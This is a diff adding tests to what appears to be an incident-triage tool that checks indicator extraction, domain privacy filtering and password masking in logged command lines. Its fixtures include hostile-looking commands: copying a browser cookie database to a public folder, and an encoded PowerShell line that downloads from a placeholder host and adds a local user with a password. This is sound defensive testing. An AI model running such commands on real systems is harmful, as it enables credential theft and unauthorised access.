@@ -142,3 +142,56 @@ def test_deleting_cookies_is_not_theft_but_copying_them_is():
                   CommandLine=f'cmd /c copy "{cookies}" C:\\Users\\Public\\c.db')]
     assert "credential_theft" not in checks_fired(delete)
     assert strengths(copy, "credential_theft") == ["Strong"]
+
+
+# ---------- Block 2: privacy ----------
+
+def test_url_host_drops_user_password_and_port():
+    from triage.iocs import url_host
+    assert url_host("https://john.doe:Secr3t@evil.example.com:8080/x") == "evil.example.com"
+    assert url_host("http://1.2.3.4/a") == "1.2.3.4"
+    assert url_host("http://[broken/") == ""
+
+
+def test_url_with_a_login_gives_the_real_host_as_domain_ioc():
+    from triage.iocs import extract_iocs
+    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{d}", Image=USER + r"\Downloads\d.exe",
+                    CommandLine="d.exe https://john.doe:Secr3t@evil.example.com/x")]
+    domains = [i["value"] for i in extract_iocs(events, run_checks(events)) if i["type"] == "domain"]
+    assert domains == ["evil.example.com"]
+
+
+def test_parent_domain_of_the_organisation_stays_private():
+    from triage.iocs import check_shareable
+    names = {"pc01.ad.contoso.com"}
+    assert check_shareable("domain", "vpn.contoso.com", names) != ""
+    assert check_shareable("domain", "contoso.com", names) != ""
+    assert check_shareable("domain", "evil.com", names) == ""
+    # co.uk keeps three labels: other .co.uk companies are still shareable.
+    assert check_shareable("domain", "other.co.uk", {"pc01.ad.example.co.uk"}) == ""
+    assert check_shareable("domain", "mail.example.co.uk", {"pc01.ad.example.co.uk"}) != ""
+
+
+def test_password_in_decoded_powershell_is_hidden():
+    import base64
+    script = "iwr http://x.example/a; net user bob Winter2026! /add"
+    command = "powershell -EncodedCommand " + base64.b64encode(script.encode("utf-16-le")).decode()
+    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{p}", Image=PS, CommandLine=command)]
+    findings = run_checks(events)
+    assert findings and all("Winter2026!" not in f["detail"] for f in findings)
+    assert "net user bob ****" in findings[0]["detail"]
+
+
+def test_more_password_forms_are_hidden():
+    from triage.parse import hide_secrets
+    # r"..." = a raw string: a backslash is just a backslash, as in a Windows command line.
+    assert hide_secrets(r"net use \\srv\c$ /user:admin Secret1") == r"net use \\srv\c$ /user:admin ****"
+    assert hide_secrets(r"net use z: \\srv\d /user:admin /persistent:no") == \
+        r"net use z: \\srv\d /user:admin /persistent:no"           # no password: nothing hidden
+    assert hide_secrets(r"7z.exe x a.zip -pSecret1 -oC:\out") == r"7z.exe x a.zip -p**** -oC:\out"
+    assert hide_secrets("mysql -u root -pSecret1 -P3306") == "mysql -u root -p**** -P3306"
+    assert hide_secrets("tar -pxf a.tar") == "tar -pxf a.tar"         # other tools: -p is not a password
+    assert hide_secrets("curl https://bob:Secret1@files.example.com/a") == \
+        "curl https://bob:****@files.example.com/a"
+    assert hide_secrets("curl -u bob:Secret1 https://x.example.com") == "curl -u bob:**** https://x.example.com"
+    assert hide_secrets("Sysmon64.exe -u force") == "Sysmon64.exe -u force"
